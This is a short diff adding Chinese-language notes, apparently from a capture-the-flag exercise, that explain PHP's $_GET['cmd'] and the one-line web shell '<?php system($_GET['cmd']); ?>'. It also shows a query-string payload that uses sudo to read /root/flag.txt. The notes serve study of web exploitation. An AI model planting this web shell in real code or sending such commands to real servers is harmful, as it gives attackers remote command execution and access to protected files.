@@ -1,0 +1,10 @@
+?cmd=sudo cat /root/flag.txt
+
+
+1. $_GET['cmd'] 是什麼？
+這是 PHP 的超全域變數，代表網址中的 GET 參數
+
+
+<?php system($_GET['cmd']); ?>
+整行意思變成：
+system("ls");
